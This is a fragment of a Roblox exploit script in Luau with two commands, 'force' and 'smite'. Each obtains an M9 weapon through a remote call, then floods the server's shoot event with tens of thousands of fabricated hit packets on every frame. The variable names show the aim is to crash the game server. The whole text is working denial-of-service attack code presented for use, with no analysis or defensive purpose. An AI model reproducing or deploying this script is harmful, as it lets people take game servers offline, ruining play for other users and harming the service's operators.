if Cmd == "force" then

CrashForceServerDie = true

Run.Stepped:Connect(function()

coroutine.wrap(function()
coroutine.resume(coroutine.create(function()

if CrashForceServerDie then

ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)

local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")

local Packets = {}

coroutine.wrap(function()
for SendToServer = 1,50000 do
coroutine.wrap(function()
coroutine.resume(coroutine.create(function()
Packets[SendToServer] = {
[1] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
},
[2] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
},
[3] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
},
[4] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
}
}
end))
end)()
end
end)()

coroutine.wrap(function()
for ReplicateSends = 1,3 do
coroutine.wrap(function()
coroutine.resume(coroutine.create(function()
ShootEvent:FireServer(Packets,Gun)
end))
end)()
end
end)()

end

end))
end)()

end)

wait()

CrashForceServerDie = false

end

if Cmd == "smite" then

CrashSmite = true

Run.Stepped:Connect(function()

for ReplicateCrash = 1,1000 do

if CrashSmite then

ItemHandler:InvokeServer(ItemGiver["M9"].ITEMPICKUP)

local Gun = LPlayer.Character:FindFirstChild("M9") or LPlayer.Backpack:FindFirstChild("M9")

local Packets = {}

for SendToServer = 1,55555 do
Packets[SendToServer] = {
Cframe = CFrame.new(),
Hit = workspace:FindFirstChildOfClass("Part")
}
end

for ReplicateSends = 1,2 do
ShootEvent:FireServer(Packets,Gun)
end

end

end

end)

wait()

CrashSmite = false

end

